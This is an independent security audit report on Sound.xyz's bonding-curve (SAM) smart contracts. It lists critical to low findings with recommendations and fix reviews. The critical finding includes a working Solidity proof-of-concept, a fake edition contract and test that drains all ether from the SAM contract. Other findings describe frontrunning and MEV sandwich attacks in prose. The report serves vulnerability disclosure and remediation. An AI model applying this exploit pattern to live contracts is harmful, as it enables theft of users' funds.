<table>
    <tr><th></th><th></th></tr>
    <tr>
        <td><img src="../logos/sound.jpg" width="250" height="250" /></td>
        <td>
            <h1>Sound.xyz Audit Report</h1><br/>
            <h2>Sound Automated Market (Bonding Curve) Mechanism</h2><br/>
            <p>Prepared by: Zach Obront, Independent Security Researcher</p>
            <p>Date: February 22nd to March 1, 2023</p>
        </td>
    </tr>
</table>

# About **Sound.xyz**

Sound is a platform for creating collaboration between musicians and fans. Users support artists they love directly, and become a part of the song's history: owning an early edition (NFT), making a public comment on the song, and accessing an exclusive community.

This security review focused on the new SAM (Sound Automated Market) feature. This functionality allows artists to create a bonding curve after their initial mint has ended. This curve increases the prices of new NFTs as the demand increases, and allows buyers to sell their NFT back to the bonding curve at the current price, creating an open market.

# About **zachobront**

Zach Obront is an independent smart contract security researcher. He serves as a Lead Senior Watson at Sherlock, a Security Researcher at Spearbit, and has identified multiple critical severity bugs in the wild, including in a Top 5 Protocol on Immunefi. You can say hi on Twitter at [@zachobront](http://twitter.com/zachobront).

# Summary

[PR #10](https://github.com/soundxyz/sound-protocol-private/pull/10) of the [soundxyz/sound-protocol-private](https://github.com/soundxyz/sound-protocol-private/) repository was audited.

The following contracts were in scope:
- core/SoundEditionV1_2.sol
- modules/SAM.sol
- modules/utils/BondingCurveLib.sol

Note: Part way through the audit, some changes were pushed to [PR #22](https://github.com/soundxyz/sound-protocol-private/pull/22) and the 1d2321b7f9a19aa14037c560b8d29814e43cd4be commit of that pull request was used for the remainder of the audit.

After completion of the fixes, the TK commit was reviewed.

# Summary of Findings

| ID     | Title                        | Severity      |
| ------ | ---------------------------- | ------------- |
| [C-01] | All funds can be stolen from the SAM contract | Critical |
| [H-01] | Golden Egg will continue to change throughout SAM | High |
| [M-01] | Artist can frontrun transactions to extract additional fees | Medium |
| [M-02] | MEV risk in periods of high volatility | Medium |
| [M-03] | Edition owner can rug by inflating token quantity after mint begins | Medium |
| [M-04] | Edition owner can manipulate Golden Egg by ending auction early | Medium |
| [M-05] | Artist can set GoldenEggFee to zero, rugging winner | Medium |
| [L-01] | mintRandomness() function does not use all intended randomness | Low |
| [L-02] | Open + Bonding Curve settings will never successfully transition edition to SAM | Low |
| [N-01] | Reentrancy Analysis | Not An Issue |

# Detailed Findings

## [C-01] All funds can be stolen from the SAM contract

The `create()` function doesn't validate that new editions added to the SAM contracts are, in fact, editions.

A malicious contract can be added that always passes the `onlyEditionOwnerOrAdmin` and `onlyBeforeMintConcluded` checks, which allows the exploiter to set all parameters at any time.

A user can therefore:
- Add their contract as an edition with a very low inflection price, increasing data.supply arbitrarily at ~ no cost
- Adjust the inflection price and point so that the curve shifts, increasing token price
- Sell their tokens back into the curve for more than was ever put in, emptying funds from the SAM contract

### Proof of Concept

Here is a drop in test that can be added to the test file to validate this attack:
```solidity
pragma solidity ^0.8.16;

import { SAM } from "@modules/SAM.sol";
import "forge-std/Test.sol";

contract EvilEdition {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function mintConcluded() public view returns (bool) {
        return false;
    }

    function samMint(address to, uint quantity) public returns (uint) {
        return 1;
    }

    function samBurn(address from, uint[] memory tokenIds) public {}
}

contract SAMTests is Test {
    SAM sam;
    EvilEdition edition;
    address exploiter = makeAddr("exploiter");

    function testZach__BigEvilExploit() public {
        vm.startPrank(exploiter);
        vm.deal(exploiter, 1);

        sam = new SAM();
        edition = new EvilEdition();
        vm.deal(address(sam), 1000 ether);
        console.log("Starting Exploiter Balance:", exploiter.balance);
        console.log("Starting SAM Balance:", address(sam).balance);

        sam.create(
            address(edition),
            0, // base
            1, // infl price
            type(uint32).max, // infl point
            1000, 0, 0 // artist, golden egg, affiliate
        );

        bytes32[] memory affProof = new bytes32[](0);
        sam.buy{value: 1}(
            address(edition),
            exploiter,
            1,
            address(0),
            affProof
        );

        sam.setInflectionPrice(address(edition), 500 ether);
        sam.setInflectionPoint(address(edition), 1);

        uint[] memory tokenIds = new uint[](1);
        tokenIds[0] = 1;
        sam.sell(
            address(edition),
            tokenIds,
            1 ether,
            exploiter
        );

        console.log("Ending Exploiter Balance:", exploiter.balance);
        console.log("Ending SAM Balance:", address(sam).balance);

    }
}
```

```solidity
Logs:
    Starting Exploiter Balance: 1
    Starting SAM Balance: 1000000000000000000000
    Ending Exploiter Balance: 1000000000000000000001
    Ending SAM Balance: 0
```

### Recommendations

It's crucial that the logic that stops a user from adjusting a bonding curve comes from a trusted source. This can be implemented in many possible ways: locally storing a value (like the `data.supply` value or a boolean flag) that locks curve changes or validating the codehash of the edition.

### Review

The `onlyBeforeMintConcluded` modifier was edited to include checking a `data.hasSold` flag, which is set when the first SAM sale takes place. The result is that no curve parameters can be manipulated once any sales are made on the bonding curve, which stops this attack.

Confirmed in commit [cf9f6bd3e59d41ed60f654fa3efe28d0fcbfaea5](https://github.com/soundxyz/sound-protocol-private/commit/cf9f6bd3e59d41ed60f654fa3efe28d0fcbfaea5).


## [H-01] Golden Egg will continue to change throughout SAM

_[Note: This issue was discovered by another researcher before I wrote up submissions, and the team made a fix in #17 during the audit. I am including it here for completeness, as the issue was present in commit 3b3de9, and to ensure that the fix is reviewed as a part of the fix review phase.]_

When a fixed price sale ends and a SAM begins, the Golden Egg is supposed to be locked. The winner of the Golden Egg is confirmed, and this user is paid a percentage of all sales from the bonding curve.

In order to determine who to send these fees to, SAM.sol calls `goldenEggFeeRecipient()`, which:
- calls `getGoldenEggTokenId(edition)` on the metadata module
- calls `ownerOf(tokenId)` on the token with the returned value

For projects that are using a SAM, the metadata module will be `OpenGoldenEggMetadata.sol`, which has the following implementation of `getGoldenEggTokenId()`:

```solidity
function getGoldenEggTokenId(address edition) public view returns (uint256 tokenId) {
    uint256 editionMaxMintable = ISoundEditionV1_1(edition).editionMaxMintable();
    uint256 mintRandomness = ISoundEditionV1_1(edition).mintRandomness();

    // If the `mintRandomness` is zero, it means that it has not been revealed,
    // and the `tokenId` should be zero, which is non-existent for our editions,
    // which token IDs start from 1.
    if (mintRandomness != 0) {
        // Calculate number between 1 and `editionMaxMintable`.
        // `mintRandomness` is set during `edition.mint()`.
        tokenId = (mintRandomness % editionMaxMintable) + 1;
    }
}
```
This can be simplified as `(edition.mintRandomness() % edition.editionMaxMintable()) + 1`.

If we look at the implementation of `editionMaxMintable()`, we see:
```solidity
function editionMaxMintable() public view returns (uint32) {
    if (block.timestamp < editionCutoffTime) {
        return editionMaxMintableUpper;
    } else {
        return uint32(FixedPointMathLib.clamp(_totalMinted(), editionMaxMintableLower, editionMaxMintableUpper));
    }
}
```
This specifies that, once the cutoff time is over, the function returns `_totalMinted()`, clamped by a minimum of `editionMaxMintableLower` and a maximum value of `editionMaxMintableUpper`.

`_totalMinted()` is a function from ERC721AUpgradeable.sol, which simply returns the total number of tokens that have been minted:
```solidity
function _totalMinted() internal view virtual returns (uint256) {
    // Counter underflow is impossible as `_currentIndex` does not decrement,
    // and it is initialized to `_startTokenId()`.
    unchecked {
        return ERC721AStorage.layout()._currentIndex - _startTokenId();
    }
}
```
This function will continue to increment the total number of tokens minted as the bonding curve is used to mint additional tokens.

As a result, for any sale that goes to SAM before `editionMaxMintableUpper` has been reached, `editionMaxMintable()` will continue to increment up with each additional SAM mint, changing the Golden Egg calculation and returning a different tokenId.

This behavior will continue until `editionMaxMintableUpper` has been reached, at which point the value will be frozen.

### Recommendation

Capture a snapshot of total tokens minted the first time `samMint()` is called, and use that value for `editionMaxMintable()` going forward.

### Review

A snapshot was added the first time that `samMint()` is called, which grabs the total minted at that point. That value is used in place of `_totalMinted()` in calculating the `editionMaxMintable()` going forward.

Confirmed in [PR #17](https://github.com/soundxyz/sound-protocol-private/pull/17/).

Note: This fix ONLY solves the problem for Editions that use `OpenGoldenEggMetadata.sol` as their metadata module, not `GoldenEggMetadata.sol`. The Sound.xyz team has confirmed that `GoldenEggMetadata.sol` has been deprecated and this will not pose a risk.

## [M-01] Artist can frontrun transactions to extract additional fees

The artist has a number of vectors to increase the fees they receive, all of which can be adjusted while the SAM is live:
- increase `artistFee` to max value
- increase `affiliateFee` to max value
- set `affiliateMerkleRoot` to a random value so proofs are rejected (because rejected proofs don't cause an error, and instead default to the artist)

These changes can result in up to 15% of the mint price being forwarded to the artist.

An artist looking to maximize fees might watch the mempool for `buy()` transactions, and use Flashbots to perform the following attack:
1) Adjust fees to the values that maximize the artist's payout
2) Execute the `buy()` transaction
3) Adjust fees back to their previous state

While the `msg.value` of the `buy()` function is used as slippage protection, there are three events in which an artist would still be able to exploit this:

1) In a period of high volatility, users will need to send higher `msg.value`s in order to ensure their transactions get through.
2) If a `buy()` tx is submitted in the same block as a large `sell()` tx, the artist could use Flashbots to create a bundle that goes `sell > change fees > buy`, with the sell creating extra buffer for the additional fees.
3) An artist may not increase the total cost at all, and may perform the attack by simply changing the affiliate root in order to steal the affiliate's fees.

### Recommendation

To some extent, the potential for this attack is equivalent to MEV extraction through sandwich attacks and is unavoidable. If users use loose slippage parameters, this is a risk they are taking.

Vectorized has said that the security threshold for artists is to (a) keep everything tamper resistant, assuming a fair owner and (b) make it public if an artist is acting unfairly. As this currently sits, the code meets this threshold, so there may not be the need for a change.

However, I would advise that the ability for an artist to steal fees from the affiliate without adjusting total user costs is a problem that is worth avoiding. My suggestion is that, in the event that a user submits a faulty affiliate proof, the transaction reverts rather than forwarding all fees on to the artist. Users could submit `address(0)` as the affiliate to avoid this revert.

This limits the profit potential of this attack, eliminates the case that is least likely to be detected, and also ensures that fees aren't accidentally sent to the artist that are intended for an affiliate.

### Review

The `buy()` function was edited to revert in the case that an affiliate was submitted but the proof was incorrect.

Confirmed in commit [66bf00a249ba6a144851b141275f588f8bd31320](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/66bf00a249ba6a144851b141275f588f8bd31320).

## [M-02] MEV risk in periods of high volatility

Bonding curves are particularly susceptible to MEV. Any transaction along the curve can be sandwich attacked by a bot that creates the following Flashbots bundles:

`buy X tokens => ORIGINAL BUY TX => sell X tokens` (where X is the maximum number of tokens that can be bought without causing the original transaction to revert).

The protocol implements protections against this. Namely:
- the `buy()` function uses `msg.value` as a max slippage parameter
- the `sell()` function has an explicit `minimumPayout` parameter

In periods of high volatility, it is likely that users will need to add sufficient buffer to these slippage parameters to get their transactions through.

This may be acceptable, as these users are explicitly accepting this slippage in setting these parameters. But the current situation allows MEV bots to capitalize on all of the consumer surplus between what a user is willing to pay and what the market requires they pay. In an ideal world, this surplus should belong to the user.

### Recommendation

Implement a 1 block freeze between buying and selling, which will remove the risk free profit that MEV bots can earn by pushing all users to buy at their max slippage rate.

### Review

Fortunately, the timestamp of the last mint / transfer was already stored in the ERC721A packed storage slot, so it was easy to simply check that `block.timestamp` is greater than that value in the `samBurn()` function.

Confirmed in commit [45765f33c7758ede2e9ad3708c623917e311be5d](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/45765f33c7758ede2e9ad3708c623917e311be5d).

Slight optimization in commit [8f4a73853498cfd05262c7149bb8de560d927a26](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/8f4a73853498cfd05262c7149bb8de560d927a26).

## [M-03] Edition owner can rug by inflating token quantity after mint begins

It appears that the intention is that, once an edition has begun minting, the maximum quantity cannot be increased. As we can see in the `setEditionMaxMintableRange()` function:

```solidity
if (currentTotalMinted != 0) {
    editionMaxMintableLower_ = uint32(FixedPointMathLib.max(editionMaxMintableLower_, currentTotalMinted));

    editionMaxMintableUpper_ = uint32(FixedPointMathLib.max(editionMaxMintableUpper_, currentTotalMinted));

    // If the upper bound is larger than the current stored value, revert.
    if (editionMaxMintableUpper_ > editionMaxMintableUpper) revert InvalidEditionMaxMintableRange();
}
```
This restricts edition owners so that they cannot increase `editionMaxMintableUpper` once any tokens have been minted. This ensures that users who are minting tokens have definitive knowledge about the ultimate supply of tokens.

However, the `setSAM()` function uses the modifier `onlyBeforeMintConcluded`, which allows edition owners to turn on the SAM until the moment that the final token is minted.

As a result, owners are able to present to their community as if there will be no SAM and, after most of the tokens have been minted, call `SoundEditionV1_2.sol::setSAM()` and `SAM.sol::create()` with a very low price and inflection point to massively inflate the token supply.

### Recommendation

Change the restriction on `setSAM()` so that it is only callable when `_totalMinted() == 0`, or include setting the SAM in the `initialize()` function.

### Review

The `setSAM()` function was changed so that the SAM can be turned off after minting has begun, but can only be added when `_totalMinted() == 0`.

Confirmed in commit [ae21fe6f843e20f35e2d0f9922b9bdbdf49d488b](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/ae21fe6f843e20f35e2d0f9922b9bdbdf49d488b).

Part of this fix included removing the `onlyBeforeMintConcluded` modifier from the `SAM::create()` function.

> Since we can't add a SAM to the edition once initial mints have concluded, the onlyBeforeMintConcluded modifier here is redundant.

Upon review, it was shared that this modifier should not be removed:

> This is a small edge case, but there's no guarantee that create() will be called before the mint is concluded.

> SAM address could be added to the Edition in advance, but artist could wait and call create() at any time, setting these parameters after the mint is complete.

> That's probably not too harmful (because it'll be totally unset beforehand) but seems safer to check.

As a result, `onlyBeforeMintConcluded` was added back to the `create()` function.

Confirmed in commit [e84a699f7cd8d814d15ba6077152f6a85998d1df](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/e84a699f7cd8d814d15ba6077152f6a85998d1df).

## [M-04] Edition owner can manipulate Golden Egg by ending auction early

The Golden Egg is intended to be chosen randomly, without the ability to be influenced by users or the edition owner. The pseudorandom function is incredibly thorough at stopping an attacker from predicting the randomness in advance to manipulate it in their favor.

However, the edition owner does have one major lever that can allow them to have influence over the randomness: they can use the `setEditionMaxMintableRange()` function to decide when the minting period ends.

Here's a basic POC:
- Edition owner sets `editionMaxMintableLower` to a low value and `editionMaxMintableUpper` to a high value.
- For each mint after the lower threshold has been crossed, they can calculate `(keccak256(_mintRandomness) % totalMinted()) + 1` to determine the tokenId that would win the Golden Egg if minting was shut down now.
- Once they see a value they are happy with, they can call `setEditionMaxMintableRange()` with a `editionMaxMintableUpper_` value that is equal to or below the current `_totalMinted()`. This will shut down fixed price minting and transition the project to the SAM.

(An alternate version of this exploit would require setting both `editionMaxMintableLower` and `editionMaxMintableUpper` to a high value, and waiting until after `editionCutoffTime` is passed to lower `editionMaxMintableLower` and end the fixed price sale.)

While at present, the benefits of this amount to just 1% of sales and may not be worth the lost revenue, it is clear that great lengths have been taken in this system to ensure that the Golden Egg is immune to manipulation, presumably so it can be safely bestowed with great value.

This exploit gives an owner the opportunity to break the fairness of the selection mechanism, which may be abused in these high-value cases.

### Recommendation

Do not allow the owner to lower the `editionMaxMintableLower` all the way to `totalMinted()`, effectively ending the sale with the current randomness value. The minimum value they can set should be `totalMinted() + X` to ensure that X additional bits of randomness are added before the Golden Egg is finalized.

### Review

The team has decided not to fix this issue:

> Technically, the owner can still manipulate the golden egg by abusing the airdrop function to mint out all the tokens when the prevrandao is at an opportune value.

> The goal is to have a good enough random mechanism that is tamper resistant (assuming a fair owner), and allow collectors to verify that the owner is fair.

> If the owner decides to be unfair, the transactions will show on block explorer, and collectors can dispute it.

## [M-05] Artist can set GoldenEggFee to zero, rugging winner

The `SAM::setGoldenEggFee()` function can be called by the edition owner at any time:
```solidity
function setGoldenEggFee(address edition, uint16 bps) public onlyEditionOwnerOrAdmin(edition) {
    SAMData storage data = _getSAMData(edition);
    if (bps > MAX_GOLDEN_EGG_FEE_BPS) revert InvalidGoldenEggFeeBPS();
    data.goldenEggFeeBPS = bps;
    emit GoldenEggFeeSet(edition, bps);
}
```
The protocol makes a great effort to ensure that, once a user wins the Golden Egg, it cannot be stripped from them. However, this feature would allow an artist to turn off the Golden Egg prize at any time.

### Recommendation

Only allow this value to be set before the mint has concluded.

### Review

The `onlyBeforeSAMPhase` modifier (which is a replacement for `onlyBeforeMintConcluded`) was added to the function.

Confirmed in commit [6ff3d418a78cfb85fd2ce8af8dce91c594816663](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/6ff3d418a78cfb85fd2ce8af8dce91c594816663).

## [L-01] mintRandomness() function does not use all intended randomness

When we call `mintRandomness()` to calculate the value, we perform the following assembly block:

```solidity
assembly {
    mstore(0x00, result)
    mstore(0x20, address())
    result := keccak256(0x00, 0x20)
}
```
The rationale for adding the address is to create more entropy across different SoundEditions, but the `address()` is not included in the value that is ultimately hashed.

### Recommendation

```diff
assembly {
    mstore(0x00, result)
    mstore(0x20, address())
-   result := keccak256(0x00, 0x20)
+   result := keccak256(0x00, 0x40)
}
```
### Review

Confirmed in commit [932bc563ae50d79f7bf6ae28a286e1ab62f3e9f8](https://github.com/soundxyz/sound-protocol-private/pull/22/commits/932bc563ae50d79f7bf6ae28a286e1ab62f3e9f8).

## [L-02] Open + Bonding Curve settings will never successfully transition edition to SAM

In the [docs](https://www.notion.so/soundxyz/Bonding-Curve-Minter-SAM-52e16e8872b74683853cd60c7b91f1d9?pvs=4#57193f0fd0904753ae977bf4ce8d6916), it lays out the Open + Bonding Curve strategy to set up an edition with unlimited mints that transitions to a bonding curve at a given time:

> The SoundEdition will be configured to have `editionCutoffTime` at the fixed price sale end time. The `editionMaxMintableLower` and `editionMaxMintableUpper` will be set to the maximum unsigned 32 bit integer.

> Once the time hits `editionCutoffTime`, the fixed price mint switches over to the bonding curve.

If these settings are used, however, the result will be that the edition will remain in a permanent fixed price mint, never transitioning to a bonding curve.

Assume we have crossed past the `editionCutoffTime`, and so should be transitioned to the SAM:
- `samMint` has the modifier `onlyAfterMintConcluded`, which checks that `mintConcluded() == true`
- `mintConcluded()` checks that `_totalMinted() >= editionMaxMintable()`, where `_totalMinted()` is the number of tokens that have ever been minted via the ERC721A
- `editionMaxMintable()` is calculated as `uint32(FixedPointMathLib.clamp(_totalMinted(), editionMaxMintableLower, editionMaxMintableUpper));` (in other words, `_totalMinted()`, but with a floor value of `editionMaxMintableLower` and a ceiling of `editionMaxMintableUpper`).
- Since both `editionMaxMintableLower` and `editionMaxMintableUpper` equal `type(uint32).max`, that value will be returned by `editionMaxMintable()`, and it will therefore fail the `mintConcluded()` check.

(Note: With the change from commit ad0c2b, `editionMaxMintable()` is now calculated as `uint32(FixedPointMathLib.max(editionMaxMintableLower, _totalMintedSnapshotInitialized ? _totalMintedSnapshot : _totalMinted()));`, but the same issue exists.)

On the other hand, the standard, non-SAM `mint()` function will remain active, as its `requireMintable()` modifier checks that `_totalMinted() + quantity <= editionMaxMintable()`, which will remain true for any quantity values less than `type(uint32).max - _totalMinted()`.

### Recommendation

In order for the desired behavior to take place, `editionMaxMintableLower` should be set to 0, while `editionMaxMintableUpper` should be set to `type(uint32).max`. The result will be that, once `editionCutoffTime` is reached, whatever quantity has been minted will be locked in as `editionMaxMintable()` and the edition will transition to a bonding curve.

### Review

This appears to have simply been an issue with the docs. The team has updated them according to the following:

> Yes that doc was worded incorrectly, today when we do open editions, we set editionMaxMintableLower to 10 or 25, and then editionMaxMintableUpper to the max.

> Otherwise, the auction would still be open after the cutoff until editionMaxMintableLower is hit.


## [N-01] Reentrancy Analysis

It was recommended before the audit to leave all reentrancy guards on SAM.sol and I would provide analysis of the necessity of each. My conclusions below are that I do not see reentrancy risk in any of these functions. I've included a breakdown of all external calls and analysis of the risks.

Reentrancy can be sneaky and complicated. While I outlined my logic below and do not see any risks at present, there are always the possibilities that (a) there is something I missed, or (b) interacting logic from upgrades or other contracts ends up relying on values — like the SAM's Ether balance — that do not currently pose a risk.

For that reason, I won't recommend that you get rid of the reentrancy guards. The following should provide context you need to make an informed decision.

### buy()

Here are the external calls (in order) that the function performs:

| call | control to | type | dangerous state |
| --- | --- | --- | --- |
| `samMint()` | edition | non-view | refund balance still in contract |
| `forceSafeTransferETH()` | msg.sender | non-view | none |

Since all the logic is performed before the two external functions are called, all the parameters are set correctly by the time these functions are invoked.

There are no external calls within `samMint()`, so the only way to take over control flow from that call would be to set up a phony edition. A user does have the ability to arbitrarily set an `edition`, so this is possible, but because the contract is in the correct state (except for holding the funds to refund the caller), there doesn't appear to be any harm that can be done via reentrancy by using this ability.

### sell()
| call | control to | type | dangerous state |
| --- | --- | --- | --- |
| `samBurn()` | edition | non-view | payout from sale still in contract |
| `forceSafeTransferETH()` | payoutTo | non-view | none |

Since all the logic is performed before the two external functions are called, all the parameters are set correctly by the time these functions are invoked.

There are no external calls within `samBurn()`, so the only way to take over control flow from that call would be to set up a phony edition. A user does have the ability to arbitrarily set an `edition`, so this is possible, but because the contract is in the correct state (except for holding the funds that will be sent to the caller), there doesn't appear to be any harm that can be done via reentrancy by using this ability.

### withdrawForAffiliate()

Here are the external calls (in order) that the function performs:

| call | control to | type | dangerous state |
| --- | --- | --- | --- |
| `forceSafeTransferETH()` | affiliate | non-view | none |

Since `_affiliateFeesAccrued[affiliate] = 0` is set before the call, there is no part of the state that is different when `forceSafeTransferETH` is called from what it would be after the function execution.

### withdrawForPlatform()

Here are the external calls (in order) that the function performs:

| call | control to | type | dangerous state |
| --- | --- | --- | --- |
| `forceSafeTransferETH()` | platformFeeAddress | non-view | none |

Since `platformFeesAccrued = 0` is set before the call, there is no part of the state that is different when `forceSafeTransferETH` is called from what it would be after the function execution.

Furthermore, the call is made to the `platformFeeAddress`, which is an address owned by the Sound.xyz team.

### withdrawForGoldenEgg()

Here are the external calls (in order) that the function performs:

| call | control to | type | dangerous state |
| --- | --- | --- | --- |
| `metadataModule()` | edition | view | contract ETH balance doesn't include transfer |
| `getGoldenEggTokenId(address)` | metadataModule | view | contract ETH balance doesn't include transfer |
| `ownerOf(uint256)` | edition | view | contract ETH balance doesn't include transfer |
| `forceSafeTransferETH()` | recipient (owner) | non-view | none |

Since `data.goldenEggFeesAccrued = 0` is set before any of these calls, the `dangerous state` is minimal. The balance of the contract is not used for any calculations within the contract, so it doesn't appear to pose a risk.

### Appendix: forceSafeTransferETH()

Each of the above functions uses `forceSafeTransferETH()`, so it is worth being sure that there are no reentrancy risks within this function. It does the following:
- checks to ensure the contract's balance is greater than the amount being sent; revert if not
- try to send the specified amount to the `to` address with 100,000 gas
- if the transfer fails, create a contract that pushes `to` on to the stack and calls `selfdestruct`

No matter which path the code takes, there will be at most 1 successful external call, so there does not appear to be any reentrancy risk within this function.

### Review

The protocol decided to keep all reentrancy guards in place, as an extra safety precaution.
